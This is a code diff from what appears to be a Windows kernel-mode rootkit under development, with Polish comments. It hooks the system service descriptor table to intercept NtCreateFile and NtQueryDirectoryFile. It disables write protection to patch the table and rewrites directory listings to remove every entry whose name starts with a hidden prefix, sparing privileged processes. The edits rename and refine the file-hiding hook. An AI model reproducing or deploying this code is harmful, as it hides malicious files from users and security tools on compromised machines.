@@ -18,19 +18,19 @@ ZWOPENKEY                   OldZwOpenKey;
 
 BOOLEAN bHooked = FALSE;
 
-NTSTATUS NewZwQueryDirectoryFile(
-	IN HANDLE hFile,
-	IN HANDLE hEvent OPTIONAL,
-	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
-	IN PVOID IoApcContext OPTIONAL,
-	OUT PIO_STATUS_BLOCK pIoStatusBlock,
-	OUT PVOID FileInformationBuffer,
-	IN ULONG FileInformationBufferLength,
-	IN FILE_INFORMATION_CLASS FileInfoClass,
-	IN BOOLEAN bReturnOnlyOneEntry,
-	IN PUNICODE_STRING PathMask OPTIONAL,
-	IN BOOLEAN bRestartQuery
-);
+//NTSTATUS NewZwQueryDirectoryFile(
+//	IN HANDLE hFile,
+//	IN HANDLE hEvent OPTIONAL,
+//	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
+//	IN PVOID IoApcContext OPTIONAL,
+//	OUT PIO_STATUS_BLOCK pIoStatusBlock,
+//	OUT PVOID FileInformationBuffer,
+//	IN ULONG FileInformationBufferLength,
+//	IN FILE_INFORMATION_CLASS FileInfoClass,
+//	IN BOOLEAN bReturnOnlyOneEntry,
+//	IN PUNICODE_STRING PathMask OPTIONAL,
+//	IN BOOLEAN bRestartQuery
+//);
 
 /*
 * Zalozenie hookow na okreslone funkcje w tablicy SSDT.
@@ -48,14 +48,14 @@ VOID HookApis()
 		irql = RaiseIRQLevel();
 
 		WPOFF();
-		DbgPrint("Hooking SSD table \n");
+		DbgPrint("Hookowanie tablicy SSDT\n");
 		// NtCreateFile
 		OldNtCreateFile	= SYSCALL( currentAPI.NtCreateFileIndex );
 		SYSCALL( currentAPI.NtCreateFileIndex ) = HookNtCreateFile;
 
 		// NtQueryDirectoryFile
 		OldNtQueryDirectoryFile	= SYSCALL( currentAPI.NtQueryDirectoryFileIndex );
-		SYSCALL( currentAPI.NtQueryDirectoryFileIndex ) = NewZwQueryDirectoryFile;
+		SYSCALL( currentAPI.NtQueryDirectoryFileIndex ) = HookNtQueryDirectoryFile;
 
 //        OldZwOpenKey = SYSTEMSERVICE(ZwOpenKey);
 //        SYSTEMSERVICE( ZwOpenKey ) = HookZwOpenKey; 
@@ -120,7 +120,7 @@ HookZwOpenKey(
 //--------------------------------------------------------------------------
 
 
-NTSTATUS NewZwQueryDirectoryFile(
+NTSTATUS HookNtQueryDirectoryFile(
 	IN HANDLE hFile,
 	IN HANDLE hEvent OPTIONAL,
 	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
@@ -155,6 +155,8 @@ NTSTATUS NewZwQueryDirectoryFile(
 			PathMask,
 			bRestartQuery);
 
+    DbgPrint("OK\n");
+
 	//sprawdzenie nazwy/pidu procesu => szybsze wyjscie ? ;)
 	currentEprocess = PsGetCurrentProcess();
 	if (IsPriviligedProcess( currentEprocess ) ) {
@@ -181,7 +183,7 @@ NTSTATUS NewZwQueryDirectoryFile(
 				// compare directory-name prefix with '_root_' to decide if to hide or not.
 
 				if (getDirEntryFileLength(p,FileInfoClass) >= 18) {
-					if( RtlCompareMemory( getDirEntryFileName(p,FileInfoClass), (PVOID)&hidePrefixW.Buffer[ 0 ], 18 ) == 18 ) 
+					if( RtlCompareMemory( getDirEntryFileName(p,FileInfoClass), (PVOID)&hidePrefixW.Buffer[ 0 ], 12 ) == 12 ) 
 					{
 						if( bLastOne ) 
 						{
@@ -204,111 +206,6 @@ NTSTATUS NewZwQueryDirectoryFile(
 	}
 	return rc;
 }
-
-//////////////////////////////////////////////////////////////////////////
-//
-//	Hooked NtQueryDirectoryFile
-//
-//	It is possible to hide some files...
-//	
-//////////////////////////////////////////////////////////////////////////
-
-NTSTATUS HookNtQueryDirectoryFile(
-	IN HANDLE hFile,
-	IN HANDLE hEvent OPTIONAL,
-	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
-	IN PVOID IoApcContext OPTIONAL,
-	OUT PIO_STATUS_BLOCK pIoStatusBlock,
-	OUT PVOID FileInformationBuffer,
-	IN ULONG FileInformationBufferLength,
-	IN FILE_INFORMATION_CLASS FileInfoClass,
-	IN BOOLEAN bReturnOnlyOneEntry,
-	IN PUNICODE_STRING PathMask OPTIONAL,
-	IN BOOLEAN bRestartQuery)
-{
-	NTSTATUS rc;
-	BOOLEAN bLastOne;
-	PDirEntry p;
-	PDirEntry pLast;
-	PCHAR processName = NULL;
-	PEPROCESS currentEprocess = NULL;
-	int iPos;
-	int iLeft;
-
-	rc = OldNtQueryDirectoryFile(
-			hFile,
-			hEvent,
-			IoApcRoutine,
-			IoApcContext,
-			pIoStatusBlock,
-			FileInformationBuffer,
-			FileInformationBufferLength,
-			FileInfoClass,
-			bReturnOnlyOneEntry,
-			PathMask,
-			bRestartQuery);
-			
-    if (IoApcRoutine!=NULL || hEvent != NULL) {
-       DbgPrint("Leaving for kamikadze ;)\n");
-       return rc;
-    }
-    
-
-//    DbgPrint("Entered HookNtQueryDirectoryFile\n");
-
-	//sprawdzenie nazwy/pidu procesu => szybsze wyjscie ? ;)
-	currentEprocess = PsGetCurrentProcess();
-	if (IsPriviligedProcess( currentEprocess ) ) {
-        DbgPrint("HookNtQueryDirectoryFile> IsPriviligedProcess == true\n");
-		return rc;
-	}
-
-	if( NT_SUCCESS( rc ) ) 
-	{
-		PDirEntry p = (PDirEntry)FileInformationBuffer;
-		PDirEntry pLast = NULL;
-		BOOLEAN bLastOne;
-
-//       	if ((FileInfoClass != FileDirectoryInformation &&
-//		 FileInfoClass != FileFullDirectoryInformation &&
-//		 FileInfoClass != FileIdFullDirectoryInformation &&
-//		 FileInfoClass != FileBothDirectoryInformation &&
-//		 FileInfoClass != FileIdBothDirectoryInformation &&
-//		 FileInfoClass != FileNamesInformation ))
-//		 return rc;
-
-	    __asm int 3
-		do 
-		{
-			bLastOne = !( p->dwLenToNext );
-//			if (p->wNameLen >= 18)
-				if( RtlCompareMemory( (PVOID)&p->suName[ 0 ], (PVOID)&hidePrefixW.Buffer[ 0 ], 18 ) == 18 ) 
-//				if( RtlCompareMemory( (PVOID)&p->suName[ 0 ], (PVOID)&hidePrefixW[ 0 ], 18 ) == 18 ) 
-				{
-					DbgPrint("Should be hooked\n");
-					if( bLastOne ) 
-					{
-						if( p == (PDirEntry)FileInformationBuffer ) rc = 0x80000006;
-						else pLast->dwLenToNext = 0;
-						break;
-					} 
-					else 
-					{
-						int iPos = ((ULONG)p) - (ULONG)FileInformationBuffer;
-						int iLeft = (ULONG)FileInformationBufferLength - iPos - p->dwLenToNext;
-						RtlCopyMemory( (PVOID)p, (PVOID)( (char *)p + p->dwLenToNext ), (ULONG)iLeft );
-						continue;
-					}
-				}
-			pLast = p;
-			p = (PDirEntry)((char *)p + p->dwLenToNext );
-		} while( !bLastOne );
-	}
-
-	return(rc);
-}
-
-
 
 NTSTATUS HookNtCreateFile(
   PHANDLE FileHandle,
